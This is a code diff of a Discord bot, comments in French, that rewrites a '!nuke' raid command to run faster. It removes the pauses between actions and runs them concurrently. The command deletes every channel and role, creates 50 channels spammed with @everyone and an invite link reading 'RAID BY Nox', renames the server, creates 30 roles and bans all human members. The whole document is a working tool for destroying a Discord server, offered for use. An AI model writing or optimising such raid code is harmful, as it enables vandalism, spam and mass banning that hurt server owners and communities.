@@ -3,10 +3,7 @@ from discord.ext import commands
 import os
 import asyncio
 
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True
-
+intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
 @bot.event
@@ -15,77 +12,57 @@ async def on_ready():
 
 @bot.command()
 async def nuke(ctx):
-    if ctx.author.guild_permissions.administrator:
-        # Pas de message de vérification ici
+    if not ctx.author.guild_permissions.administrator:
+        print("Pas les permissions.")
+        return
 
-        # Supprimer salons et rôles (avec pauses)
+    guild = ctx.guild
+
+    async def delete_channels():
+        await asyncio.gather(*[channel.delete() for channel in guild.channels if channel.type != discord.ChannelType.category])
+
+    async def delete_roles():
+        await asyncio.gather(*[role.delete() for role in guild.roles if role.name != "@everyone"])
+
+    async def create_channels_and_spam():
+        tasks = []
+        for _ in range(50):
+            channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
+            for _ in range(5):
+                tasks.append(channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone"))
+        await asyncio.gather(*tasks)
+
+    async def rename_server():
         try:
-            # Supprimer tous les salons
-            for channel in ctx.guild.channels:
-                try:
-                    await channel.delete()
-                    print(f"Salon {channel.name} supprimé.")
-                    await asyncio.sleep(1)  # Attendre 1 seconde entre les suppressions
-                except Exception as e:
-                    print(f"Erreur lors de la suppression du salon {channel.name}: {str(e)}")
+            await guild.edit(name="☠️ RAID BY Nox ☠️")
+        except:
+            pass
 
-            # Supprimer tous les rôles sauf @everyone
-            for role in ctx.guild.roles:
-                if role.name != "@everyone":
-                    try:
-                        await role.delete()
-                        print(f"Rôle {role.name} supprimé.")
-                        await asyncio.sleep(0.5)  # Attendre 0.5 seconde entre les suppressions
-                    except discord.Forbidden:
-                        print(f"Impossible de supprimer le rôle {role.name}: Permission refusée.")
-                    except Exception as e:
-                        print(f"Erreur lors de la suppression du rôle {role.name}: {str(e)}")
+    async def create_roles():
+        await asyncio.gather(*[
+            guild.create_role(name="☠️ RAID BY Nox ☠️")
+            for _ in range(30)
+        ])
 
-            # Créer 50 salons et envoyer 5 messages dans chaque salon
-            for i in range(50):
-                try:
-                    channel = await ctx.guild.create_text_channel(f"☠️ RAID BY Nox ☠️ {i+1}")
-                    print(f"Salon {channel.name} créé.")
-                    await asyncio.sleep(1)  # Attendre entre la création des salons
+    async def ban_members():
+        await asyncio.gather(*[
+            member.ban(reason="RAID BY Nox")
+            for member in guild.members if not member.bot
+        ])
 
-                    # Envoyer 5 messages dans chaque salon
-                    for _ in range(5):
-                        await channel.send("☠️ RAID BY Nox ☠️\nhttps://discord.gg/c8S6rtwTqR\n@everyone")
-                        await asyncio.sleep(0.3)  # Petite pause pour ne pas spammer trop vite
-
-                except Exception as e:
-                    print(f"Erreur lors de la création du salon ou de l'envoi des messages : {str(e)}")
-
-            # Renommer le serveur
-            try:
-                await ctx.guild.edit(name="☠️ RAID BY Nox ☠️")
-                print("Serveur renommé avec succès.")
-            except Exception as e:
-                print(f"Erreur lors du renommage du serveur : {str(e)}")
-
-            # Créer 30 rôles
-            for i in range(30):
-                try:
-                    await ctx.guild.create_role(name="☠️ RAID BY Nox ☠️")
-                    print(f"Rôle {i+1} créé.")
-                    await asyncio.sleep(0.5)  # Petite pause pour éviter de trop solliciter Discord
-                except Exception as e:
-                    print(f"Erreur lors de la création du rôle {i+1}: {str(e)}")
-
-            # Bannir tous les membres sauf les bots
-            for member in ctx.guild.members:
-                try:
-                    if not member.bot:
-                        await member.ban()
-                        print(f"Membre {member.name} banni.")
-                        await asyncio.sleep(0.2)  # Petite pause pour éviter trop de bannissements
-                except Exception as e:
-                    print(f"Erreur lors du bannissement du membre {member.name}: {str(e)}")
-
-            print("Nuke terminé.")
-        except Exception as e:
-            print(f"Erreur : {str(e)}")
-    else:
-        print("Le membre n'a pas la permission d'exécuter cette commande.")
+    try:
+        await asyncio.gather(
+            delete_channels(),
+            delete_roles()
+        )
+        await asyncio.gather(
+            create_channels_and_spam(),
+            rename_server(),
+            create_roles(),
+            ban_members()
+        )
+        print("Nuke terminé.")
+    except Exception as e:
+        print(f"Erreur : {str(e)}")
 
 bot.run(os.getenv("TOKEN"))
